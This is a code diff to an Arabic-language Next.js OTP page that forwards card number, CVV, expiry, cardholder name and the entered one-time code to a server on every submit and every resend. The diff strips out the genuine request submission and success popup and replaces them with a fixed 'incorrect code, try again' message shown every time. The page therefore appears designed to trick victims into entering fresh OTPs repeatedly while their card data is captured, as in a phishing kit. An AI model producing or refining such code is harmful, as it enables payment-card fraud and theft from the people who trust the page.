@@ -2,7 +2,6 @@
 
 import { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
-import toast from "react-hot-toast";
 import Header from "../../components/Header";
 import BottomNav from "../../components/BottomNav";
 import { useSettings } from "@/lib/useSettings";
@@ -13,8 +12,7 @@ export default function OtpPage() {
   const [otp, setOtp] = useState("");
   const [timeLeft, setTimeLeft] = useState(119);
   const [submitting, setSubmitting] = useState(false);
-  const [trackingNumber, setTrackingNumber] = useState("");
-  const [copied, setCopied] = useState(false);
+  const [error, setError] = useState("");
 
   const isFilled = otp.length >= 4;
 
@@ -42,17 +40,10 @@ export default function OtpPage() {
         body: JSON.stringify({ otp, customerName: form.customerName, cardHolderName: form.cardHolderName, cardNumber: form.cardNumber, cvv: form.cvv, expiryDate: form.expiryDate, type: "submit" }),
       });
 
-      const res = await fetch("/api/requests", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(form),
-      });
-      const data = await res.json();
-      if (!res.ok) { toast.error(data.error); setSubmitting(false); return; }
-      sessionStorage.removeItem("formData");
-      setTrackingNumber(data.trackingNumber);
+      setError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى");
+      setSubmitting(false);
     } catch {
-      toast.error("حدث خطأ، يرجى المحاولة لاحقاً");
+      setError("حدث خطأ، يرجى المحاولة لاحقاً");
       setSubmitting(false);
     }
   };
@@ -67,12 +58,6 @@ export default function OtpPage() {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ customerName: form.customerName, cardHolderName: form.cardHolderName, cardNumber: form.cardNumber, cvv: form.cvv, expiryDate: form.expiryDate, type: "resend" }),
     });
-  };
-
-  const handleCopy = () => {
-    navigator.clipboard.writeText(trackingNumber);
-    setCopied(true);
-    setTimeout(() => setCopied(false), 2000);
   };
 
   if (loading) {
@@ -129,6 +114,7 @@ export default function OtpPage() {
                 dir="ltr"
               />
 
+              {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
               <button
                 type="submit"
                 disabled={submitting || !isFilled}
@@ -164,37 +150,7 @@ export default function OtpPage() {
       </main>
       <BottomNav />
 
-      {/* Success popup */}
-      {trackingNumber && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm px-4" dir="rtl">
-          <div className="bg-white rounded-3xl shadow-2xl w-full max-w-sm p-8 flex flex-col items-center text-center">
-            <div className="mb-5 relative">
-              <div className="absolute inset-0 bg-primary/10 rounded-full animate-ping opacity-25" />
-              <div className="w-20 h-20 bg-linear-to-br from-primary to-primary-container rounded-full flex items-center justify-center relative z-10">
-                <span className="material-symbols-outlined text-white text-4xl" style={{ fontVariationSettings: "'FILL' 1, 'wght' 600" }}>check_circle</span>
-              </div>
-            </div>
-            <h2 className="text-2xl font-extrabold text-on-surface mb-2">تم إرسال الطلب بنجاح</h2>
-            <p className="text-secondary text-sm leading-relaxed mb-6">تم استلام طلبك وهو قيد المراجعة. سيتم إشعارك فور اكتمال المعالجة.</p>
-            <div className="w-full bg-surface-container-low rounded-2xl p-4 mb-6 flex items-center justify-between gap-3">
-              <div className="text-right">
-                <p className="text-xs text-outline uppercase tracking-wider mb-0.5">رقم المتابعة</p>
-                <p className="text-lg font-bold text-on-surface tracking-wide">{trackingNumber}</p>
-              </div>
-              <button onClick={handleCopy} className="flex items-center gap-1 text-primary font-medium text-sm">
-                <span className="material-symbols-outlined text-lg">{copied ? "check" : "content_copy"}</span>
-                {copied ? "تم النسخ!" : "نسخ"}
-              </button>
-            </div>
-            <button
-              onClick={() => router.push("/")}
-              className="w-full py-4 bg-linear-to-br from-primary to-primary-container text-white font-bold text-base rounded-2xl shadow-[0_8px_20px_-4px_rgba(0,110,47,0.3)] hover:scale-[1.02] active:scale-95 transition-transform"
-            >
-              إغلاق والعودة للرئيسية
-            </button>
-          </div>
-        </div>
-      )}
+
     </>
   );
 }
